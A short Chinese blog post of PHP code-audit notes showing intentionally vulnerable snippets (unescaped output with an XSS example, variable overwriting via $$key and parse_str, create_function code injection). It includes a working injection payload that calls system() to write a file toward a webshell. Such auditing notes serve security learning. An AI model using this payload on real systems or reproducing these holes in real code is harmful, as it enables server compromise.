title: PHP代码审计小记
date: 2015-07-21 23:01:39
tags: PHP
categories: H-blog
---
![php](/img/php.jpg)
<!--more-->
代码部分来自 <https://code.google.com/p/pasc2at/wiki/SimplifiedChinese>

## 0x00 这种，现在应该没人会这么写吧？
```php
<?php
//key.php?<script>alert(1);</script>=1&bbb=2
//print_R($_GET); 
 foreach ($_GET AS $key => $value)
{
        print $key."\n";
}
?>
```
## 0x01 变量覆盖，并不懂为啥有人会这么写

```php
<?php
//var.php?a=fuck      
$a='hi';
foreach($_GET as $key => $value) {
        $$key = $value;
}
print $a;    //输出fuck
?>
```

## 0x02 同样也是变量覆盖。。

```php
//var.php?var=new
$var = 'init';                     
parse_str($_SERVER['QUERY_STRING']);  //$_SERVER['QUERY_STRING']的值为get参数
//parse_str(string,array) 设置变量的函数，array没设置就会覆盖已存在的变量
print $var;
```

## 0x03 代码执行漏洞

```php
//how to exp this code
$sort_by=$_GET['sort_by'];
$sorter='strnatcasecmp';
$databases=array('test','test');
$sort_function = '  return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]); ';
usort($databases, create_function('$a, $b', $sort_function));
```
这个我研究了下, 有点屌啊~~

首先, 漏洞永远在于用户的可控点上, 所以上面的代码漏洞只可能存在于 `$sort_function = '  return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]); ';` 之中

payload: 
`sort_by=1"],$b["2"]) * system("echo '<?php phpinfo(); ' > a.php ");//`

只要权限够, 就能写入一句话, 然后get webshell..

类似的函数还有:
```
assert()
call_user_func()
call_user_func_array()
create_function()
变量函数
...
```

























